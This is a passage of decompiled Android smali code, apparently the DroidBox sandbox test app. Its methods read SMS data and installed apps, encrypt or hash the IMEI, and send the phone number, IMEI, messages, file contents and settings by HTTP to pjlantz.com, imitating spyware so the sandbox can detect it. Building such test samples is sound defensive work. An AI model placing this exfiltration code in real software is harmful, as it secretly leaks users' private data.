    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->phoneNbr:Ljava/lang/String;

    .line 211
    const/16 v2, 0xb

    invoke-interface {v14, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    #v2=(Reference);
    move-object v0, v2

    move-object/from16 v1, p0

    iput-object v0, v1, Ldroidbox/tests/DroidBoxTests;->msg:Ljava/lang/String;

    goto :goto_3
.end method

.method public testAddBookmark()V
    .locals 3

    .prologue
    .line 235
    const-string v1, "Test"

    #v1=(Reference);
    const-string v2, "[*] testAddBookmark()"

    #v2=(Reference);
    invoke-static {v1, v2}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 236
    new-instance v0, Landroid/content/ContentValues;

    #v0=(UninitRef);
    invoke-direct {v0}, Landroid/content/ContentValues;-><init>()V

    .line 237
    .local v0, bookmarkValues:Landroid/content/ContentValues;
    #v0=(Reference);
    const-string v1, "bookmark"

    const/4 v2, 0x1

    #v2=(One);
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    #v2=(Reference);
    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 238
    const-string v1, "title"

    const-string v2, "Test"

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 239
    const-string v1, "url"

    const-string v2, "http://www.pjlantz.com"

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 240
    return-void
.end method

.method public testCircPermission()V
    .locals 4

    .prologue
    .line 216
    const-string v0, "Test"

    #v0=(Reference);
    const-string v1, "[*] testCircPermission()"

    #v1=(Reference);
    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 217
    new-instance v0, Landroid/content/Intent;

    #v0=(UninitRef);
    const-string v1, "android.intent.action.VIEW"

    .line 218
    new-instance v2, Ljava/lang/StringBuilder;

    #v2=(UninitRef);
    const-string v3, "http://pjlantz.com/phone.php?phone="

    #v3=(Reference);
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v2=(Reference);
    iget-object v3, p0, Ldroidbox/tests/DroidBoxTests;->phoneNbr:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 219
    #v0=(Reference);
    const/high16 v1, 0x1000

    .line 218
    #v1=(Integer);
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    move-result-object v0

    .line 217
    invoke-virtual {p0, v0}, Ldroidbox/tests/DroidBoxTests;->startActivity(Landroid/content/Intent;)V

    .line 220
    return-void
.end method

.method public testCryptAES()V
    .locals 9

    .prologue
    .line 337
    const-string v7, "Test"

    #v7=(Reference);
    const-string v8, "[*] testCryptAES()"

    #v8=(Reference);
    invoke-static {v7, v8}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 341
    :try_start_0
    const-string v7, "AES"

    invoke-static {v7}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 342
    .local v0, c:Ljavax/crypto/Cipher;
    #v0=(Reference);
    new-instance v6, Ljavax/crypto/spec/SecretKeySpec;

    #v6=(UninitRef);
    sget-object v7, Ldroidbox/tests/DroidBoxTests;->KEY:[B

    const-string v8, "AES"

    invoke-direct {v6, v7, v8}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 343
    .local v6, keySpec:Ljavax/crypto/spec/SecretKeySpec;
    #v6=(Reference);
    const/4 v7, 0x1

    #v7=(One);
    invoke-virtual {v0, v7, v6}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 344
    iget-object v7, p0, Ldroidbox/tests/DroidBoxTests;->imei:Ljava/lang/String;

    #v7=(Reference);
    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    .line 345
    .local v3, data:[B
    #v3=(Reference);
    invoke-virtual {v0, v3}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v5

    .line 346
    .local v5, enc:[B
    #v5=(Reference);
    invoke-direct {p0, v5}, Ldroidbox/tests/DroidBoxTests;->toHex([B)Ljava/lang/String;

    move-result-object v7

    iput-object v7, p0, Ldroidbox/tests/DroidBoxTests;->encryptedImei:Ljava/lang/String;

    .line 348
    const-string v7, "AES"

    invoke-static {v7}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v1

    .line 349
    .local v1, d:Ljavax/crypto/Cipher;
    #v1=(Reference);
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    #v2=(UninitRef);
    sget-object v7, Ldroidbox/tests/DroidBoxTests;->KEY:[B

    const-string v8, "AES"

    invoke-direct {v2, v7, v8}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 350
    .local v2, d_keySpec:Ljavax/crypto/spec/SecretKeySpec;
    #v2=(Reference);
    const/4 v7, 0x2

    #v7=(PosByte);
    invoke-virtual {v1, v7, v2}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 351
    invoke-virtual {v1, v5}, Ljavax/crypto/Cipher;->doFinal([B)[B
    :try_end_0
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljavax/crypto/NoSuchPaddingException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/security/InvalidKeyException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljavax/crypto/IllegalBlockSizeException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljavax/crypto/BadPaddingException; {:try_start_0 .. :try_end_0} :catch_4

    .line 363
    .end local v0           #c:Ljavax/crypto/Cipher;
    .end local v1           #d:Ljavax/crypto/Cipher;
    .end local v2           #d_keySpec:Ljavax/crypto/spec/SecretKeySpec;
    .end local v3           #data:[B
    .end local v5           #enc:[B
    .end local v6           #keySpec:Ljavax/crypto/spec/SecretKeySpec;
    :goto_0
    #v0=(Conflicted);v1=(Conflicted);v2=(Conflicted);v3=(Conflicted);v4=(Conflicted);v5=(Conflicted);v6=(Conflicted);v7=(Conflicted);
    return-void

    .line 352
    :catch_0
    #v4=(Uninit);
    move-exception v7

    #v7=(Reference);
    move-object v4, v7

    .line 353
    .local v4, e:Ljava/security/NoSuchAlgorithmException;
    #v4=(Reference);
    invoke-virtual {v4}, Ljava/security/NoSuchAlgorithmException;->printStackTrace()V

    goto :goto_0

    .line 354
    .end local v4           #e:Ljava/security/NoSuchAlgorithmException;
    :catch_1
    #v4=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v4, v7

    .line 355
    .local v4, e:Ljavax/crypto/NoSuchPaddingException;
    #v4=(Reference);
    invoke-virtual {v4}, Ljavax/crypto/NoSuchPaddingException;->printStackTrace()V

    goto :goto_0

    .line 356
    .end local v4           #e:Ljavax/crypto/NoSuchPaddingException;
    :catch_2
    #v4=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v4, v7

    .line 357
    .local v4, e:Ljava/security/InvalidKeyException;
    #v4=(Reference);
    invoke-virtual {v4}, Ljava/security/InvalidKeyException;->printStackTrace()V

    goto :goto_0

    .line 358
    .end local v4           #e:Ljava/security/InvalidKeyException;
    :catch_3
    #v4=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v4, v7

    .line 359
    .local v4, e:Ljavax/crypto/IllegalBlockSizeException;
    #v4=(Reference);
    invoke-virtual {v4}, Ljavax/crypto/IllegalBlockSizeException;->printStackTrace()V

    goto :goto_0

    .line 360
    .end local v4           #e:Ljavax/crypto/IllegalBlockSizeException;
    :catch_4
    #v4=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v4, v7

    .line 361
    .local v4, e:Ljavax/crypto/BadPaddingException;
    #v4=(Reference);
    invoke-virtual {v4}, Ljavax/crypto/BadPaddingException;->printStackTrace()V

    goto :goto_0
.end method

.method public testCryptDES()V
    .locals 9

    .prologue
    .line 369
    const-string v7, "Test"

    #v7=(Reference);
    const-string v8, "[*] testCryptDES()"

    #v8=(Reference);
    invoke-static {v7, v8}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 373
    :try_start_0
    const-string v7, "DES"

    invoke-static {v7}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 374
    .local v0, c:Ljavax/crypto/Cipher;
    #v0=(Reference);
    new-instance v6, Ljavax/crypto/spec/SecretKeySpec;

    #v6=(UninitRef);
    sget-object v7, Ldroidbox/tests/DroidBoxTests;->KEY2:[B

    const-string v8, "DES"

    invoke-direct {v6, v7, v8}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 375
    .local v6, keySpec:Ljavax/crypto/spec/SecretKeySpec;
    #v6=(Reference);
    const/4 v7, 0x1

    #v7=(One);
    invoke-virtual {v0, v7, v6}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 376
    iget-object v7, p0, Ldroidbox/tests/DroidBoxTests;->imei:Ljava/lang/String;

    #v7=(Reference);
    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    .line 377
    .local v3, data:[B
    #v3=(Reference);
    invoke-virtual {v0, v3}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v5

    .line 378
    .local v5, enc:[B
    #v5=(Reference);
    invoke-direct {p0, v5}, Ldroidbox/tests/DroidBoxTests;->toHex([B)Ljava/lang/String;

    move-result-object v7

    iput-object v7, p0, Ldroidbox/tests/DroidBoxTests;->encryptedImei:Ljava/lang/String;

    .line 380
    const-string v7, "DES"

    invoke-static {v7}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v1

    .line 381
    .local v1, d:Ljavax/crypto/Cipher;
    #v1=(Reference);
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    #v2=(UninitRef);
    sget-object v7, Ldroidbox/tests/DroidBoxTests;->KEY2:[B

    const-string v8, "DES"

    invoke-direct {v2, v7, v8}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 382
    .local v2, d_keySpec:Ljavax/crypto/spec/SecretKeySpec;
    #v2=(Reference);
    const/4 v7, 0x2

    #v7=(PosByte);
    invoke-virtual {v1, v7, v2}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 383
    invoke-virtual {v1, v5}, Ljavax/crypto/Cipher;->doFinal([B)[B
    :try_end_0
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljavax/crypto/NoSuchPaddingException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/security/InvalidKeyException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljavax/crypto/IllegalBlockSizeException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljavax/crypto/BadPaddingException; {:try_start_0 .. :try_end_0} :catch_4

    .line 395
    .end local v0           #c:Ljavax/crypto/Cipher;
    .end local v1           #d:Ljavax/crypto/Cipher;
    .end local v2           #d_keySpec:Ljavax/crypto/spec/SecretKeySpec;
    .end local v3           #data:[B
    .end local v5           #enc:[B
    .end local v6           #keySpec:Ljavax/crypto/spec/SecretKeySpec;
    :goto_0
    #v0=(Conflicted);v1=(Conflicted);v2=(Conflicted);v3=(Conflicted);v4=(Conflicted);v5=(Conflicted);v6=(Conflicted);v7=(Conflicted);
    return-void

    .line 384
    :catch_0
    #v4=(Uninit);
    move-exception v7

    #v7=(Reference);
    move-object v4, v7

    .line 385
    .local v4, e:Ljava/security/NoSuchAlgorithmException;
    #v4=(Reference);
    invoke-virtual {v4}, Ljava/security/NoSuchAlgorithmException;->printStackTrace()V

    goto :goto_0

    .line 386
    .end local v4           #e:Ljava/security/NoSuchAlgorithmException;
    :catch_1
    #v4=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v4, v7

    .line 387
    .local v4, e:Ljavax/crypto/NoSuchPaddingException;
    #v4=(Reference);
    invoke-virtual {v4}, Ljavax/crypto/NoSuchPaddingException;->printStackTrace()V

    goto :goto_0

    .line 388
    .end local v4           #e:Ljavax/crypto/NoSuchPaddingException;
    :catch_2
    #v4=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v4, v7

    .line 389
    .local v4, e:Ljava/security/InvalidKeyException;
    #v4=(Reference);
    invoke-virtual {v4}, Ljava/security/InvalidKeyException;->printStackTrace()V

    goto :goto_0

    .line 390
    .end local v4           #e:Ljava/security/InvalidKeyException;
    :catch_3
    #v4=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v4, v7

    .line 391
    .local v4, e:Ljavax/crypto/IllegalBlockSizeException;
    #v4=(Reference);
    invoke-virtual {v4}, Ljavax/crypto/IllegalBlockSizeException;->printStackTrace()V

    goto :goto_0

    .line 392
    .end local v4           #e:Ljavax/crypto/IllegalBlockSizeException;
    :catch_4
    #v4=(Uninit);v7=(Conflicted);
    move-exception v7

    #v7=(Reference);
    move-object v4, v7

    .line 393
    .local v4, e:Ljavax/crypto/BadPaddingException;
    #v4=(Reference);
    invoke-virtual {v4}, Ljavax/crypto/BadPaddingException;->printStackTrace()V

    goto :goto_0
.end method

.method public testCryptHash()V
    .locals 6

    .prologue
    .line 401
    const-string v4, "Test"

    #v4=(Reference);
    const-string v5, "[*] testCryptHash()"

    #v5=(Reference);
    invoke-static {v4, v5}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 402
    const-string v3, "Hash me"

    .line 404
    .local v3, testStr:Ljava/lang/String;
    #v3=(Reference);
    const/4 v0, 0x0

    .line 407
    .local v0, digest:Ljava/security/MessageDigest;
    :try_start_0
    #v0=(Null);
    const-string v4, "MD5"

    invoke-static {v4}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;

    move-result-object v0

    .line 408
    #v0=(Reference);
    invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/security/MessageDigest;->update([B)V

    .line 409
    invoke-virtual {v0}, Ljava/security/MessageDigest;->digest()[B

    move-result-object v2

    .line 410
    .local v2, messageDigest:[B
    #v2=(Reference);
    invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/security/MessageDigest;->digest([B)[B

    .line 413
    const-string v4, "SHA1"

    invoke-static {v4}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;

    move-result-object v0

    .line 414
    invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/security/MessageDigest;->update([B)V

    .line 415
    invoke-virtual {v0}, Ljava/security/MessageDigest;->digest()[B

    move-result-object v2

    .line 418
    const/4 v0, 0x0

    .line 419
    #v0=(Null);
    const-string v4, "SHA1"

    invoke-static {v4}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;

    move-result-object v0

    .line 420
    #v0=(Reference);
    iget-object v4, p0, Ldroidbox/tests/DroidBoxTests;->imei:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/security/MessageDigest;->update([B)V

    .line 421
    invoke-virtual {v0}, Ljava/security/MessageDigest;->digest()[B

    move-result-object v2

    .line 422
    invoke-direct {p0, v2}, Ldroidbox/tests/DroidBoxTests;->toHex([B)Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Ldroidbox/tests/DroidBoxTests;->hashedImei:Ljava/lang/String;
    :try_end_0
    .catch Ljava/security/NoSuchAlgorithmException; {:try_start_0 .. :try_end_0} :catch_0

    .line 426
    .end local v2           #messageDigest:[B
    :goto_0
    #v1=(Conflicted);v2=(Conflicted);
    return-void

    .line 423
    :catch_0
    #v1=(Uninit);
    move-exception v4

    move-object v1, v4

    .line 424
    .local v1, e:Ljava/security/NoSuchAlgorithmException;
    #v1=(Reference);
    invoke-virtual {v1}, Ljava/security/NoSuchAlgorithmException;->printStackTrace()V

    goto :goto_0
.end method

.method public testGetInstalledApps()V
    .locals 6

    .prologue
    .line 246
    const-string v3, "Test"

    #v3=(Reference);
    const-string v4, "[*] testGetInstalledApps()"

    #v4=(Reference);
    invoke-static {v3, v4}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 247
    invoke-virtual {p0}, Ldroidbox/tests/DroidBoxTests;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 248
    .local v2, pm:Landroid/content/pm/PackageManager;
    #v2=(Reference);
    const/16 v3, 0x80

    #v3=(PosShort);
    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v1

    .line 249
    .local v1, packages:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/ApplicationInfo;>;"
    #v1=(Reference);
    const-string v3, ""

    #v3=(Reference);
    iput-object v3, p0, Ldroidbox/tests/DroidBoxTests;->installedApps:Ljava/lang/String;

    .line 250
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_0
    #v0=(Conflicted);v5=(Conflicted);
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    #v4=(Boolean);
    if-nez v4, :cond_0

    .line 252
    return-void

    .line 250
    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    #v0=(Reference);
    check-cast v0, Landroid/content/pm/ApplicationInfo;

    .line 251
    .local v0, packageInfo:Landroid/content/pm/ApplicationInfo;
    iget-object v4, p0, Ldroidbox/tests/DroidBoxTests;->installedApps:Ljava/lang/String;

    #v4=(Reference);
    new-instance v5, Ljava/lang/StringBuilder;

    #v5=(UninitRef);
    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v5, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v5=(Reference);
    iget-object v4, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, ":"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Ldroidbox/tests/DroidBoxTests;->installedApps:Ljava/lang/String;

    goto :goto_0
.end method

.method public testNetworkHTTP()V
    .locals 11

    .prologue
    .line 480
    const-string v7, "Test"

    #v7=(Reference);
    const-string v8, "[*] testNetworkHTTP()"

    #v8=(Reference);
    invoke-static {v7, v8}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 483
    const/4 v4, 0x0

    .line 484
    .local v4, url:Ljava/net/URL;
    #v4=(Null);
    const/4 v6, 0x0

    .line 487
    .local v6, urlConnection:Ljava/net/HttpURLConnection;
    :try_start_0
    #v6=(Null);
    new-instance v5, Ljava/net/URL;

    #v5=(UninitRef);
    new-instance v7, Ljava/lang/StringBuilder;

    #v7=(UninitRef);
    const-string v8, "http://pjlantz.com/phone.php?phone="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v7=(Reference);
    iget-object v8, p0, Ldroidbox/tests/DroidBoxTests;->number:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 488
    .end local v4           #url:Ljava/net/URL;
    .local v5, url:Ljava/net/URL;
    :try_start_1
    #v5=(Reference);
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v7

    move-object v0, v7

    #v0=(Reference);
    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v6, v0

    .line 489
    #v6=(Reference);
    new-instance v3, Ljava/io/BufferedReader;

    #v3=(UninitRef);
    new-instance v7, Ljava/io/InputStreamReader;

    #v7=(UninitRef);
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    #v7=(Reference);
    invoke-direct {v3, v7}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 490
    .local v3, rd:Ljava/io/BufferedReader;
    #v3=(Reference);
    const-string v2, ""

    .line 491
    .local v2, line:Ljava/lang/String;
    :cond_0
    #v2=(Reference);
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_0

    .line 492
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V

    .line 493
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 496
    new-instance v4, Ljava/net/URL;

    #v4=(UninitRef);
    new-instance v7, Ljava/lang/StringBuilder;

    #v7=(UninitRef);
    const-string v8, "http://pjlantz.com/imei.php?imei="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v7=(Reference);
    iget-object v8, p0, Ldroidbox/tests/DroidBoxTests;->encryptedImei:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v4, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 497
    .end local v5           #url:Ljava/net/URL;
    .restart local v4       #url:Ljava/net/URL;
    :try_start_2
    #v4=(Reference);
    invoke-virtual {v4}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v7

    move-object v0, v7

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v6, v0

    .line 498
    new-instance v3, Ljava/io/BufferedReader;

    .end local v3           #rd:Ljava/io/BufferedReader;
    #v3=(UninitRef);
    new-instance v7, Ljava/io/InputStreamReader;

    #v7=(UninitRef);
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    #v7=(Reference);
    invoke-direct {v3, v7}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 499
    .restart local v3       #rd:Ljava/io/BufferedReader;
    :cond_1
    #v3=(Reference);
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_1

    .line 500
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V

    .line 501
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 505
    new-instance v5, Ljava/net/URL;

    #v5=(UninitRef);
    new-instance v7, Ljava/lang/StringBuilder;

    #v7=(UninitRef);
    const-string v8, "http://pjlantz.com/msg.php?msg="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v7=(Reference);
    iget-object v8, p0, Ldroidbox/tests/DroidBoxTests;->msg:Ljava/lang/String;

    const-string v9, " "

    #v9=(Reference);
    const-string v10, "+"

    #v10=(Reference);
    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0

    .line 506
    .end local v4           #url:Ljava/net/URL;
    .restart local v5       #url:Ljava/net/URL;
    :try_start_3
    #v5=(Reference);
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v7

    move-object v0, v7

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v6, v0

    .line 507
    new-instance v3, Ljava/io/BufferedReader;

    .end local v3           #rd:Ljava/io/BufferedReader;
    #v3=(UninitRef);
    new-instance v7, Ljava/io/InputStreamReader;

    #v7=(UninitRef);
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    #v7=(Reference);
    invoke-direct {v3, v7}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 508
    .restart local v3       #rd:Ljava/io/BufferedReader;
    :cond_2
    #v3=(Reference);
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_2

    .line 509
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V

    .line 510
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 513
    new-instance v4, Ljava/net/URL;

    #v4=(UninitRef);
    new-instance v7, Ljava/lang/StringBuilder;

    #v7=(UninitRef);
    const-string v8, "http://pjlantz.com/file.php?file="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v7=(Reference);
    iget-object v8, p0, Ldroidbox/tests/DroidBoxTests;->fileContent:Ljava/lang/String;

    const-string v9, " "

    const-string v10, "+"

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v4, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1

    .line 514
    .end local v5           #url:Ljava/net/URL;
    .restart local v4       #url:Ljava/net/URL;
    :try_start_4
    #v4=(Reference);
    invoke-virtual {v4}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v7

    move-object v0, v7

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v6, v0

    .line 515
    new-instance v3, Ljava/io/BufferedReader;

    .end local v3           #rd:Ljava/io/BufferedReader;
    #v3=(UninitRef);
    new-instance v7, Ljava/io/InputStreamReader;

    #v7=(UninitRef);
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    #v7=(Reference);
    invoke-direct {v3, v7}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 516
    .restart local v3       #rd:Ljava/io/BufferedReader;
    :cond_3
    #v3=(Reference);
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_3

    .line 517
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V

    .line 518
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 521
    new-instance v5, Ljava/net/URL;

    #v5=(UninitRef);
    new-instance v7, Ljava/lang/StringBuilder;

    #v7=(UninitRef);
    const-string v8, "http://pjlantz.com/settings.php?alarmset="

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v7=(Reference);
    iget-object v8, p0, Ldroidbox/tests/DroidBoxTests;->settings:Ljava/lang/String;

    const-string v9, " "

    const-string v10, "+"

